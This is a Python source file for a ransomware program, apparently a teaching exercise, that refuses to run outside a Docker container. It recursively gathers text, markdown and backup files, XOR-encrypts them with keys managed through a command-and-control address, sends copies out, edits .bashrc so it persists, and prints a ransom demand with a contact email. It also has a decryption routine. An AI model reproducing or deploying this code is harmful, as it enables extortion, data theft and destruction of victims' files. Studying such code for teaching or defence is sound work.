import logging
import socket
import re
import sys
from os import system
from pathlib import Path
from secret_manager import SecretManager
from ascii_wonders import *

CNC_ADDRESS = "cnc:6666"
INSTALL_PATH = "/root/ransomware"


class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
        self._log = logging.getLogger(self.__class__.__name__)
        self._secret_manager = SecretManager(CNC_ADDRESS)



    def check_hostname_is_docker(self) -> None:
        # At first, we check if we are in a docker
        # to prevent running Veilleuxthis program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter:str) -> list:
        # return all files matching the filter
        """files_list is a list containing the paths of every file found recursively by the rglob() function in the file system.
        The paths are stored as strings."""
        
        # file_list = [str(p) for p in list(Path().rglob(filter))]
        file_list = []
        for p in Path().rglob(filter):
            if "/etc/" in str(p):
                continue
            file_list.append(str(p)) 

        self._log.debug(file_list)
        return file_list

    def encrypt(self) -> None:
        # main function for encrypting (see PDF)
        self._log.debug("PASSING THROUGH encrypt() FUNCTION!!!!")
        
        self.add_reminder_to_bashrc(INSTALL_PATH)

        files_to_encrypt = []
        files_to_encrypt.extend(self.get_files("*.txt"))
        files_to_encrypt.extend(self.get_files("*.md"))
        files_to_leak = files_to_encrypt.copy()
        files_to_encrypt.extend(self.get_files("*.bak"))

        self._log.debug(files_to_encrypt)

        self._secret_manager.setup()
        self._secret_manager.xorfiles(files_to_encrypt)

        token = self._secret_manager.get_hex_token()
        print(OH_NO)
        print(f"Your txt files have been encrypted! Please send an email to support@igotpwned.com with object '{token}' to retrieve your data.")
        print(HERE_WIPE_YOUR_TEARS)
        print(ASCII_TISSUE_BOX)
        self._secret_manager.leak_files(files_to_leak)
        return None
    
    def add_reminder_to_bashrc(self, path: str) -> None:
        for bashrc in self.get_files("*bashrc*"):
            self._log.debug(bashrc)
            system(f"cp {bashrc} {bashrc}.bak")
            system(f"echo 'python {path}/ransomware.py --decrypt' >> {bashrc}")
        return None

    def decrypt(self):
        # main function for decrypting (see PDF)
        self._log.debug("PASSING THROUGH decrypt() FUNCTION!!!!")
        self._secret_manager.load()
        candidate_key = input("Please enter your cryptographic key: ")
        while not self._secret_manager.set_key(candidate_key):
            print("The key you have entered is incorrect.")
            candidate_key = input("Please enter your cryptographic key: ")

        # self._secret_manager.set_key(candidate_key)
        files_to_decrypt = []
        files_to_decrypt.extend(self.get_files("*.txt"))
        files_to_decrypt.extend(self.get_files("*.bak"))
        files_to_decrypt.extend(self.get_files("*.md"))

        self._secret_manager.xorfiles(files_to_decrypt)
        self._secret_manager.clean(INSTALL_PATH)
        print("\rOkay, your data has been restored to its former state. Have a nice day :)")

        for bashrc_bak in self.get_files("*bashrc.bak"):
            system(f"cp {bashrc_bak} {bashrc_bak[0:-4]}")


if __name__ == "__main__":
    if "--verbose" in sys.argv:
        logging.basicConfig(level=logging.DEBUG)
    else:
        logging.basicConfig(level=logging.INFO)

    ransomware = Ransomware()
    if not "--decrypt" in sys.argv:
        ransomware.encrypt()
    if "--decrypt" in sys.argv:
        ransomware.decrypt()
